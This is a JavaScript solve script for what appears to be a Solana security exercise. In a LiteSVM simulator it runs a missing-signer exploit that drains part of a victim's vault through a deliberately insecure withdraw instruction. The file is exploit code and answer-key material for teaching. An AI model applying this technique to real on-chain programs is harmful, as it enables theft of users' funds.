// L1 solve script (S10): missing-signer exploit, end to end on LiteSVM.
// Flow: fund victim+attacker → init victim vault → withdraw_insecure UNSIGNED
// as attacker (authority = victim pubkey, NOT signed) → assert vault drained.
// Exits 0 with PASS + state diff; non-zero naming the miss otherwise.
// Usage: node solve-l1.mjs [path-to-l1_signer.so]
import { createHash } from "node:crypto";
import { LiteSVM, FailedTransactionMetadata } from "litesvm";
import {
	AccountRole,
	address,
	appendTransactionMessageInstruction,
	createTransactionMessage,
	generateKeyPairSigner,
	getAddressCodec,
	getProgramDerivedAddress,
	lamports,
	pipe,
	setTransactionMessageFeePayerSigner,
	signTransactionMessageWithSigners
} from "@solana/kit";
import { SYSTEM_PROGRAM_ADDRESS } from "@solana-program/system";

const PROGRAM = address("JA3qiz3KpQkEtL4bMLWoWazcSHYYrUHyKRg5UgtVkzuA");
const SO =
	process.argv[2] ??
	"/home/aleksic/spacestation/mvp/content/programs/l1-signer/l1_signer.so";
const INITIAL = 100_000_000n;
const STEAL = 40_000_000n;

const disc = (name) =>
	Uint8Array.from(createHash("sha256").update(`global:${name}`).digest().subarray(0, 8));

const u64le = (n) => {
	const b = Buffer.alloc(8);
	b.writeBigUInt64LE(n);
	return new Uint8Array(b);
};

const fail = (why) => {
	console.error(`SOLVE FAIL: ${why}`);
	process.exit(1);
};

const svm = new LiteSVM();
const victim = await generateKeyPairSigner();
const attacker = await generateKeyPairSigner();
svm.airdrop(victim.address, lamports(10_000_000_000n));
svm.airdrop(attacker.address, lamports(1_000_000_000n));
svm.addProgramFromFile(PROGRAM, SO);

const [vault] = await getProgramDerivedAddress({
	programAddress: PROGRAM,
	seeds: [new TextEncoder().encode("vault"), getAddressCodec().encode(victim.address)]
});

async function send(ix, payer) {
	const tx = await pipe(
		createTransactionMessage({ version: 0 }),
		(tx) => setTransactionMessageFeePayerSigner(payer, tx),
		(tx) => svm.setTransactionMessageLifetimeUsingLatestBlockhash(tx),
		(tx) => appendTransactionMessageInstruction(ix, tx),
		(tx) => signTransactionMessageWithSigners(tx)
	);
	return svm.sendTransaction(tx);
}

function vaultBalance() {
	const acc = svm.getAccount(vault);
	if (!acc) fail("vault account missing after init");
	const data = acc.data instanceof Uint8Array ? acc.data : Uint8Array.from(Buffer.from(acc.data, "base64"));
	return Buffer.from(data.buffer, data.byteOffset + 8 + 32, 8).readBigUInt64LE(0);
}

// 1. Victim initializes their vault (signed, legitimate).
{
	const data = new Uint8Array([...disc("initialize_vault"), ...u64le(INITIAL)]);
	const r = await send(
		{
			programAddress: PROGRAM,
			accounts: [
				{ address: vault, role: AccountRole.WRITABLE },
				{ address: victim.address, role: AccountRole.WRITABLE_SIGNER },
				{ address: SYSTEM_PROGRAM_ADDRESS, role: AccountRole.READONLY }
			],
			data
		},
		victim
	);
	if (r instanceof FailedTransactionMetadata) fail(`init failed: ${r.err()}`);
}
if (vaultBalance() !== INITIAL) fail("init balance wrong");

// 2. Attacker withdraws WITHOUT the victim's signature (the bug).
{
	const data = new Uint8Array([...disc("withdraw_insecure"), ...u64le(STEAL)]);
	const r = await send(
		{
			programAddress: PROGRAM,
			accounts: [
				{ address: vault, role: AccountRole.WRITABLE },
				{ address: victim.address, role: AccountRole.READONLY }
			],
			data
		},
		attacker
	);
	if (r instanceof FailedTransactionMetadata) fail(`exploit rejected (bug absent?): ${r.err()}`);
}
const after = vaultBalance();
if (after !== INITIAL - STEAL) fail(`state assert: balance ${after}, want ${INITIAL - STEAL}`);
console.log(`SOLVE PASS: vault ${INITIAL} -> ${after} (attacker gained ${STEAL})`);
